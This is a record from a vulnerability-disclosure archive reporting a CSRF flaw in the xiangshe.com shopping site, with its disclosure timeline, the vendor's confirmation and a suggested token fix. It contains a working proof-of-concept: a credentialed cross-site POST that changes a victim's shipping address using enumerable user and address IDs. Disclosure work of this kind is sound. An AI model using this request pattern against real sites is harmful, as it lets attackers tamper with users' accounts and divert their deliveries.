{"id": 28120, "wybug_id": "wooyun-2015-0123458", "wybug_title": "香舍网 CSRF漏洞一枚，可随意修改他人收货地址", "wybug_corp": "香舍网", "wybug_author": "nina", "wybug_date": "2015-06-29 15:05", "wybug_open_date": "2015-08-13 15:08", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向公众公开  简要描述： 香舍网，修改收货地址，存在CSRF漏洞，可随意修改别人的收货地址。。。。 详细说明：  登录账户A。，修改其收货地址，并抓包\n\n查看其收货地址,修改成功;\n\n可以看到，修改收货请求为post请求，同时，一切参数均是可预测（AddressId、UserId均是以1自然升序，完全可遍历猜测！）。猜测存在csrf，便去试一把。。。构造csrfxiangshe.html\nxmlhttp.open(\"POST\", \"http://www.xiangshe.com/my/doEditaddress.do\", true);\txmlhttp.withCredentials = true;\txmlhttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\txmlhttp.send(\"MAddressInfo.AddressId=92589&MAddressInfo.UserId=150936&MAddressInfo.TrueName=woo163163&pro=1%2C110000&city=1%2C1%2C110100&zone=110101&MAddressInfo.DetailAddress=gfdsgtrshtjhtyujmy16311&MAddressInfo.Zip=&MAddressInfo.LinkPhone=&MAddressInfo.HandPhone=13611111111&MAddressInfo.Email=\");\n访问链接csrfxiangshe.html\n\n刷新收货地址\n\n可以看到收货地址被成功修改（此测试只改了收货人与联系电话）只要被攻击者不小心点击此链接，他的收货地址便可被修改。   漏洞证明：  同上   修复方案：  增加token   版权声明：转载请注明来源 nina@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-06-29 15:06 厂商回复： 已经处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}